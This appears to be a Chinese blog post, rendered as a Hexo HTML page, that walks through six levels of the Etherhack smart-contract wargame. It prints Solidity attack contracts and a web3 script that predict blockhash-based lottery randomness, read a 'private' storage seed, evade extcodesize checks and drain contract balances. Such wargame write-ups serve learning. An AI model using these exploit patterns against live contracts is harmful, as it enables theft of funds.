@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Etherhack靶场的WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Etherhack靶场实战">
+<meta property="og:url" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="Etherhack靶场的WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223214633219.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223214719834.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223220003078.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224163333048.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224172920844.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224181012708.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224181035603.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221225112742504.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221225122403490.png">
+<meta property="og:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221225122528529.png">
+<meta property="article:published_time" content="2022-12-23T13:27:17.000Z">
+<meta property="article:modified_time" content="2022-12-25T04:25:33.240Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223214633219.png">
+
+<link rel="canonical" href="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Etherhack靶场实战 | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="知而不行，谓之不诚">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Etherhack靶场实战
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-23 21:27:17" itemprop="dateCreated datePublished" datetime="2022-12-23T21:27:17+08:00">2022-12-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-25 12:25:33" itemprop="dateModified" datetime="2022-12-25T12:25:33+08:00">2022-12-25</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a target="_blank" rel="noopener" href="https://etherhack.positive.com/#/">Etherhack靶场</a>的WP</p>
+<span id="more"></span>
+
+<h1 id="1-Azino777"><a href="#1-Azino777" class="headerlink" title="1.Azino777"></a>1.Azino777</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>The goal of this level is to win the lottery and hit the jackpot!</code></p>
+<p>本关要求我们拿走大奖。</p>
+<p>看完合约就能发现只要我们输入的uint256数字与，rand函数根据区块哈希和一个数字生成出的uint256数据一样，我们就可以拿走合约中所有的余额，也就是得到大奖，这就很明白了，直接写攻击合约即可。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    Azino777 public azi;</span><br><span class="line">    function attack(address _azi)public&#123;</span><br><span class="line">        azi = Azino777(_azi);</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 private constant FACTOR =</span><br><span class="line">        1157920892373161954235709850086879078532699846656405640394575840079131296399;</span><br><span class="line">    function att()public payable&#123;</span><br><span class="line">        uint256 factor = (FACTOR * 100) / 100;</span><br><span class="line">        uint256 lastBlockNumber = block.number - 1;</span><br><span class="line">        uint256 hashVal = uint256(block.blockhash(lastBlockNumber));</span><br><span class="line">        azi.spin.value(msg.value)(uint256((uint256(hashVal) / factor)) % 100);</span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw()public&#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路很明确，复制rand合约的生成步骤，然后直接将生成出来的数据传染spin函数即可。</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223214633219.png" alt="image-20221223214633219"></p>
+<p>因为是“大奖“嘛，我们传入10ether，然后调用攻击合约看是否能成功。</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223214719834.png" alt="image-20221223214719834"></p>
+<p>成功了，那么攻击完成。</p>
+<h1 id="Private-Ryan"><a href="#Private-Ryan" class="headerlink" title="Private Ryan"></a>Private Ryan</h1><h1 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h1><p><code>We added a private seed, nobody will ever learn it!</code></p>
+<p>与上题看似一样的题目，不一样的是第二题多了一个种子，种子在合约创建的时候生成，而在rand函数中也同样用到了种子，而种子却同样保存在storage里面，那么我们只需要把种子查出来就可以了。</p>
+<h1 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h1><p>web3脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&quot;web3&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> provider = <span class="string">&quot;ws://localhost:8545&quot;</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(provider)</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">    seed = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(<span class="string">&quot;0xaC9fCBA56E42d5960f813B9D0387F3D3bC003338&quot;</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(seed)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">get</span>()</span><br></pre></td></tr></table></figure>
+
+<p>这里得到的输出结果是0x00000000000000000000000000000000000000000000000000000000000000ce</p>
+<p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    PrivateRyan public pri;</span><br><span class="line">    uint256 public seed;</span><br><span class="line">    function attack(address _pri,uint256 _seed)public&#123;</span><br><span class="line">        pri = PrivateRyan(_pri);</span><br><span class="line">        seed = _seed;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 private constant FACTOR =</span><br><span class="line">        1157920892373161954235709850086879078532699846656405640394575840079131296399;</span><br><span class="line">    function att()public payable&#123;</span><br><span class="line">        uint256 factor = (FACTOR * 100) / 100;</span><br><span class="line">        uint256 lastBlockNumber = block.number - seed;</span><br><span class="line">        uint256 hashVal = uint256(block.blockhash(lastBlockNumber));</span><br><span class="line">        pri.spin.value(msg.value)(uint256((uint256(hashVal) / factor)) % 100);</span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw()public&#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再将seed传入攻击合约进行攻击，还是一样的步骤。</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221223220003078.png" alt="image-20221223220003078"></p>
+<p>攻击完成。</p>
+<h1 id="Wheel-of-Fortune"><a href="#Wheel-of-Fortune" class="headerlink" title="Wheel of Fortune"></a>Wheel of Fortune</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p><code>This lottery uses blockhash of a future block, try to beat it!</code></p>
+<p>题目还是要我们拿走所有的余额。</p>
+<p>看完合约，很容易能看出来，在下一次spin时，会判断上一个spin入games的结构体中bet与根据对应blocknumber进行运算的数字是否相等，而block.number在当前区块的哈希值是无法预知的，看似无法进行预测当前区块哈希。</p>
+<p>但block.blockhash只能取256个区块内的区块哈希值，所以如果我们在第一次spin之后，等待256个区块之后再进行第二次spin，区块哈希值就只会是0，那么我们就可以传入对应的值。</p>
+<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>运算合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    function figure()public view returns(uint256)&#123;</span><br><span class="line">        return uint256(keccak256(bytes32(0))) % 100;</span><br><span class="line">    &#125;</span><br><span class="line">    function blockNum()public view returns(uint256)&#123;</span><br><span class="line">        return block.number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>figure函数用来计算rand根据0生成的数字,数字为47，blockNum取得当前区块数，判断是否过了256个区块。</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224163333048.png" alt="image-20221224163333048"></p>
+<p>所以只要我们第一次spin传入47，等待256个区块进行第二次spin即可</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224172920844.png" alt="image-20221224172920844"></p>
+<p>第二次调用完成，合约余额清空。</p>
+<h1 id="CallMeMaybe"><a href="#CallMeMaybe" class="headerlink" title="CallMeMaybe"></a>CallMeMaybe</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p><code>This contract does not like when other contracts are calling it.</code></p>
+<p>还是要我们提余额，这个题就很简单了，只要在合约的构造函数里面调用，合约的关联地址长度就是0了。</p>
+<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    CallMeMaybe public cal;</span><br><span class="line">    function attack(address _addr)public&#123;</span><br><span class="line">        cal = CallMeMaybe(_addr);</span><br><span class="line">        cal.HereIsMyNumber();</span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw()public&#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    function()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接把地址放入攻击合约部署即可</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224181012708.png" alt="image-20221224181012708"></p>
+<p>攻击完成后把余额提出来等于没损失。</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221224181035603.png" alt="image-20221224181035603"></p>
+<h1 id="The-Lock"><a href="#The-Lock" class="headerlink" title="The Lock"></a>The Lock</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>题目环境有点问题，在github上找到源码</p>
+<p>题目合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract TheLock &#123;</span><br><span class="line">    bool public unlocked;</span><br><span class="line"></span><br><span class="line">    function TheLock() public &#123;</span><br><span class="line">      unlocked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes4 pin) public payable returns(bool) &#123;</span><br><span class="line">        require(msg.value &gt;= 0.5 ether);</span><br><span class="line">        uint result;</span><br><span class="line">        uint sum;</span><br><span class="line">        for (uint8 i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            uint c = uint(pin[i]);</span><br><span class="line">            if (c &gt;= 48 &amp;&amp; c &lt;= 57) &#123;</span><br><span class="line">                uint digit = c - 48;</span><br><span class="line">                sum += digit ** 4;</span><br><span class="line">                result = result * 10 + digit;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(sum == result) &#123;</span><br><span class="line">            unlocked = true;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目让我们解锁。需要我们传入bytes4的一个数据，这个数据的每一个字节分别经过两个不同的运算规则后的总和要相等，最开始我以为这是一个数学题，想了一会我发现可以传0值或者传入每个字节都等于48也就是0x303030，可以直接通过。</p>
+<h2 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h2><p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221225112742504.png" alt="image-20221225112742504"></p>
+<p>传0值，攻击完成</p>
+<h1 id="PriateShip"><a href="#PriateShip" class="headerlink" title="PriateShip"></a>PriateShip</h1><p>题目要我们把blackJackIsHauled变为true，也就是成功调用sailAway函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">            size := extcodesize(a)</span><br><span class="line">        &#125;</span><br><span class="line">        if (size &gt; 0) &#123;</span><br><span class="line">            revert(); // it is too early to sail away</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而需要我们让a的关联地址长度为0，这里的a就是anchor，要改变anchor就要调用dropAnchor函数。</p>
+<p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221225122403490.png" alt="image-20221225122403490"></p>
+<p>这里能看到里面存在了ff，也就是自毁函数，而合约自毁后就会使关联地址为0，所以只要我们传入的区块数量满足条件，即可通过。</p>
+<h2 id="攻击-5"><a href="#攻击-5" class="headerlink" title="攻击"></a>攻击</h2><p><img src="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20221225122528529.png" alt="image-20221225122528529"></p>
+<p>攻击完成。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" title="Etherhack靶场实战">http://example.com/2022/12/23/Etherhack靶场实战/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/03/2022paradigm-CTF-hintFinance-WP/" rel="prev" title="2022paradigm CTF hintFinance WP">
+      <i class="fa fa-chevron-left"></i> 2022paradigm CTF hintFinance WP
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Azino777"><span class="nav-number">1.</span> <span class="nav-text">1.Azino777</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Private-Ryan"><span class="nav-number">2.</span> <span class="nav-text">Private Ryan</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">4.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Wheel-of-Fortune"><span class="nav-number">5.</span> <span class="nav-text">Wheel of Fortune</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">5.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CallMeMaybe"><span class="nav-number">6.</span> <span class="nav-text">CallMeMaybe</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">6.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-3"><span class="nav-number">6.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Lock"><span class="nav-number">7.</span> <span class="nav-text">The Lock</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">7.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-4"><span class="nav-number">7.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PriateShip"><span class="nav-number">8.</span> <span class="nav-text">PriateShip</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-5"><span class="nav-number">8.1.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">知而不行，谓之不诚</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">197k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:59</span>
+</div>
